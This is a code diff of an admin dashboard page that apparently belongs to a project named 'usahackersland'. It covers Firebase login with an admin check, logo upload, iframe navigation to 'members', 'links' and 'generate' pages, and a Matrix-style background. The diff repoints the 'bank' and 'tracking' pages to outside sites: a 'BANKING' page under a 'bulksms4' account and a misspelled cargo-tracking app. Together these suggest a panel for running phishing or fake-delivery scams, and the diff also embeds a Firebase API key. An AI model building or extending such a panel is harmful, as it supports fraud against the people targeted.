@@ -131,7 +131,7 @@
 <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
 
 <script>
-  // Initialize Firebase
+  // Firebase init
   const firebaseConfig = {
     apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
     authDomain: "usahackersland.firebaseapp.com",
@@ -144,10 +144,10 @@
   const auth = firebase.auth();
   const db = firebase.firestore();
 
-  // Redirect if not logged in or not admin
+  // Redirect if not logged in
   auth.onAuthStateChanged(async (user) => {
     if (!user) {
-      window.location.href = "login.html"; // redirect to login page
+      window.location.href = "login.html";
       return;
     }
     try {
@@ -156,25 +156,22 @@
         alert("Access denied. Admins only.");
         await auth.signOut();
         window.location.href = "login.html";
-        return;
       }
     } catch (err) {
       console.error("Error checking user role:", err);
-      alert("Error verifying user. Please login again.");
+      alert("Error verifying user.");
       await auth.signOut();
       window.location.href = "login.html";
-      return;
     }
   });
 
-  // Logout button
   document.getElementById('logoutBtn').addEventListener('click', () => {
     auth.signOut().then(() => {
       window.location.href = "login.html";
     });
   });
 
-  // Logo upload & persistence via localStorage
+  // Logo upload persistence
   const logoInput = document.getElementById('logoInput');
   const dashboardLogo = document.getElementById('dashboardLogo');
   logoInput.addEventListener('change', e => {
@@ -187,13 +184,10 @@
     };
     reader.readAsDataURL(file);
   });
-  // Load saved logo
   const savedLogo = localStorage.getItem('platformLogo');
-  if (savedLogo) {
-    dashboardLogo.src = savedLogo;
-  }
+  if (savedLogo) dashboardLogo.src = savedLogo;
 
-  // Navigation page loading
+  // Page loading
   const base = "Social-media-links/";
   function loadPage(page) {
     const iframe = document.getElementById('iframePage');
@@ -205,52 +199,42 @@
       'members': base + "members.html",
       'links': base + "links.html",
       'generate': base + "generate.html",
-      'bank': base + "bank.html",
-      'tracking': base + "tracking.html"
+      'bank': "https://bulksms4.github.io/BANKING/",
+      'tracking': "https://x-cargo-exprees.web.app/"
     };
-    if(pages[page]) iframe.src = pages[page];
+    if (pages[page]) iframe.src = pages[page];
   }
 
-  // MATRIX Background effect
+  // MATRIX Background
   const canvas = document.getElementById('backgroundCanvas');
   const ctx = canvas.getContext('2d');
   let width, height;
-  let animationFrameId;
-
   function resizeCanvas() {
     width = canvas.width = window.innerWidth;
     height = canvas.height = window.innerHeight;
   }
   window.addEventListener('resize', resizeCanvas);
   resizeCanvas();
-
   const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
   const fontSize = 16;
   let columns = Math.floor(width / fontSize);
   const drops = new Array(columns).fill(1);
-
   function draw() {
     ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
     ctx.fillRect(0, 0, width, height);
-
     ctx.fillStyle = '#0F0';
     ctx.font = fontSize + 'px monospace';
-
     for (let i = 0; i < drops.length; i++) {
       const text = letters.charAt(Math.floor(Math.random() * letters.length));
       ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
       if (drops[i] * fontSize > height && Math.random() > 0.975) {
         drops[i] = 0;
       }
-
       drops[i]++;
     }
-    animationFrameId = requestAnimationFrame(draw);
+    requestAnimationFrame(draw);
   }
   draw();
-
 </script>
-
 </body>
 </html>
